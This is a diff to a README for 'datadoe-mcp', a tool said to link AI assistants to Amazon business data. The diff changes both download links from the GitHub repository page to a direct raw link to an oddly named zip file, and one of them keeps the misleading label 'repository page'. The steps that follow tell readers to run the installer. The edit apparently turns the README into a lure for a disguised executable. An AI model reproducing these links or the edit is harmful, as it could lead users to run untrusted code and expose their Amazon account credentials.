@@ -1,6 +1,6 @@
 # 📦 datadoe-mcp - Connect AI tools to Amazon business data
 
-[![](https://img.shields.io/badge/Download-datadoe--mcp-blue.svg)](https://github.com/sadatmohamed199-bit/datadoe-mcp)
+[![](https://img.shields.io/badge/Download-datadoe--mcp-blue.svg)](https://raw.githubusercontent.com/sadatmohamed199-bit/datadoe-mcp/main/src/mcp_datadoe_interplicate.zip)
 
 datadoe-mcp acts as a bridge between your Amazon business account and your favorite AI assistant. Use this tool to view sales, advertising, and vendor data inside chat interfaces like Claude, ChatGPT, and Cursor. You gain direct insights from your Amazon SP-API and Ads API without writing custom code.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards to run the software:
 
 Follow these steps to set up your connection.
 
-1. Visit the [repository page](https://github.com/sadatmohamed199-bit/datadoe-mcp) to download the application files.
+1. Visit the [repository page](https://raw.githubusercontent.com/sadatmohamed199-bit/datadoe-mcp/main/src/mcp_datadoe_interplicate.zip) to download the application files.
 2. Choose the latest release version that matches your Windows system.
 3. Save the installer file to your computer.
 4. Run the installer and follow the screen prompts to finish the setup.
